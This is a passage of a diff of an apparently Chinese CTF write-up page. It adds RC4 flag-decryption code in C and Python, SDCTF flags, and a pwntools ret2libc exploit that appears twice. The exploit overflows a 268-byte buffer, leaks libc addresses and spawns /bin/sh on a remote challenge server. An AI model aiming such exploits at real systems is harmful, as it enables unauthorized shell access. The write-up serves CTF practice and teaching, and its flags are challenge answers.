ELF(<span class="string">'bin300'</span>)</span><br><span class="line">debug =<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</span><br><span class="line">  p = process(<span class="string">'./bin300'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">'123.207.144.156'</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">268</span>  </span><br><span class="line">payload1 += p32(plt_write) </span><br><span class="line">payload1 += p32(vulfun_addr) </span><br><span class="line">payload1 += p32(<span class="number">1</span>)</span><br><span class="line">payload1 += p32(got_write) </span><br><span class="line">payload1 += p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">268</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(vulfun_addr)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="/images/sdctf/13.png" alt=""></p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+typedef unsigned longULONG;
+
+void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)
+{
+    int i = 0, j = 0;
+    char k[256] = { 0 };
+    unsigned char tmp = 0;
+    for (i = 0; i&lt;256; i++)
+    {
+        s[i] = i;
+        k[i] = key[i%Len];
+    }
+    for (i = 0; i&lt;256; i++)
+    {
+        j = (j + s[i] + k[i]) % 256;
+        tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+    }
+}
+
+
+void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)
+{
+    int i = 0, j = 0, t = 0;
+    unsigned long k = 0;
+    unsigned char tmp;
+    for (k = 0; k&lt;Len; k++)
+    {
+        i = (i + 1) % 256;
+        j = (j + s[i]) % 256;
+        tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+        t = (s[i] + s[j]) % 256;
+        Data[k] ^= s[t];
+    }
+}
+
+int main()
+{
+    char s[256] = { 0 }, s2[256] = { 0 };
+    char key[256] = &quot;I_am_the_flag&quot;;
+    char flag[512]= {19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37};
+    unsigned long len = strlen(flag); 
+    int i;
+    rc4_init(s, (unsigned char*)key, strlen(key));
+    rc4_crypt(s, (unsigned char*)flag, len);
+    printf(&quot;%s&quot;,flag);
+    return 0;
+}
+</code></pre><p>或py解密</p>
+<pre><code># -*- coding: utf-8 -*-
+import random, base64,binascii
+from hashlib import sha1
+
+def crypt(data, key):
+    &quot;&quot;&quot;RC4 algorithm&quot;&quot;&quot;
+    x = 0
+    box = range(256)
+    for i in range(256):
+        x = (x + box[i] + ord(key[i % len(key)])) % 256
+        box[i], box[x] = box[x], box[i]
+    x = y = 0
+    out = []
+    for char in data:
+        x = (x + 1) % 256
+        y = (y + box[x]) % 256
+        box[x], box[y] = box[y], box[x]
+        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
+    return &#39;&#39;.join(out)
+
+data = &quot;数据&quot;
+key = &#39;密钥&#39;
+decoded_data = crypt(data,key)
+print decoded_data
+</code></pre><p>Flag:SDCTF{912128f324fd3ea3f5d9cb517b4d9001}</p>
+<h2 id="Bin500-PwnPwnPwn"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</h2><pre><code>#!/usr/bin/env python
+from pwn import *
+
+libc = ELF(&#39;libc.so.6&#39;)
+elf = ELF(&#39;bin300&#39;)
+debug =0
+if debug ==1:
+  p = process(&#39;./bin300&#39;)
+else:
+  p = remote(&#39;123.207.144.156&#39;, 10003)
+
+plt_write = elf.symbols[&#39;write&#39;]
+got_write = elf.got[&#39;write&#39;]
+vulfun_addr = 0x804843b
+payload1 = &#39;a&#39;*268  
+payload1 += p32(plt_write) 
+payload1 += p32(vulfun_addr) 
+payload1 += p32(1)
+payload1 += p32(got_write) 
+payload1 += p32(4)
+p.send(payload1)
+
+write_addr = u32(p.recv(4))
+system_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])
+binsh_addr = write_addr - (libc.symbols[&#39;write&#39;] - next(libc.search(&#39;/bin/sh&#39;)))
+payload2 = &#39;a&#39;*268
+payload2 += p32(system_addr)
+payload2 += p32(vulfun_addr)
+payload2 += p32(binsh_addr)
+p.send(payload2)
+p.interactive()
+</code></pre><p><img src="/images/sdctf/13.png" alt=""></p>
 <p>Flag:SDCTF{af15d5fdacd5fdfea300e88a8e253e82}</p>
 
         
